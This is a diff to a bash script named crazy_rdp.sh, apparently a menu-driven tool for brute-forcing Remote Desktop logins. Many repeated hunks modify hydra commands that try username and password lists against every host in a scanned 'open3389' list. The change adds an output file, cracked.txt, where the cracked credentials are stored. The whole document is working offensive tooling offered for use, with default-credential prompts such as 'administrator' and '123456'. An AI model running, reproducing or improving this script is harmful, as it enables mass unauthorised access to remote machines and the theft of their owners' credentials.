@@ -10487,7 +10487,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10497,7 +10497,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10507,7 +10507,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10516,7 +10516,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10560,7 +10560,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10570,7 +10570,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10580,7 +10580,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10589,7 +10589,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10633,7 +10633,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10643,7 +10643,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10653,7 +10653,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10662,7 +10662,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10704,7 +10704,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10714,7 +10714,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10724,7 +10724,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10733,7 +10733,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10777,7 +10777,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10787,7 +10787,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10797,7 +10797,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10806,7 +10806,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10849,7 +10849,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10859,7 +10859,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10869,7 +10869,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10878,7 +10878,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10922,7 +10922,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10932,7 +10932,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10942,7 +10942,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10951,7 +10951,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -10995,7 +10995,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11005,7 +11005,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11015,7 +11015,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11024,7 +11024,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11068,7 +11068,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11078,7 +11078,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11088,7 +11088,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11097,7 +11097,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11141,7 +11141,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11151,7 +11151,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11161,7 +11161,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11170,7 +11170,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11214,7 +11214,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11224,7 +11224,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11234,7 +11234,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11243,7 +11243,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11287,7 +11287,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11297,7 +11297,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11307,7 +11307,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11316,7 +11316,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11360,7 +11360,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11370,7 +11370,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11380,7 +11380,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11389,7 +11389,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11433,7 +11433,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11443,7 +11443,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11453,7 +11453,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11462,7 +11462,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11506,7 +11506,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11516,7 +11516,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11526,7 +11526,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11535,7 +11535,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11579,7 +11579,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11589,7 +11589,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -11599,7 +11599,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
